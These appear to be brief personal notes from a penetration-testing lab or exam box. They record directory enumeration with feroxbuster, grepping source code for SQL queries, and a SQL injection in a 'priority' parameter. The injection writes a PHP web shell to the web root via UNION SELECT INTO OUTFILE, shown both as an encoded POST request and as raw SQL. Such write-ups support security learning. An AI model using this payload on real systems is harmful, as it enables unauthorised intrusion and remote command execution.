- Discovered few non standard ports with webservers
- Ran ferobuster and found a login
```bash
feroxbuster -u http://192.168.227.147:50080 -r   
```
- There were a source code file where we can the command below after downloading
```bash
grep -Rnw './' -e 'SELECT'
```
- Found a file phpinfo.php and extracted the server root
- Found a SQLi in a parameter.
![[Pasted image 20230915183542.png]]

and injected with POST because get gave an error,

POST /issue/checkByPriority?priority=Normal%27+UNION+SELECT+%22%3C%3Fphp+echo+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcma.php%27+--+%2F%2F HTTP/1.1

```sql
Normal' UNION SELECT "<?php echo system($_GET['cmd']);?>" INTO OUTFILE '/srv/http/cma.php' -- //
```

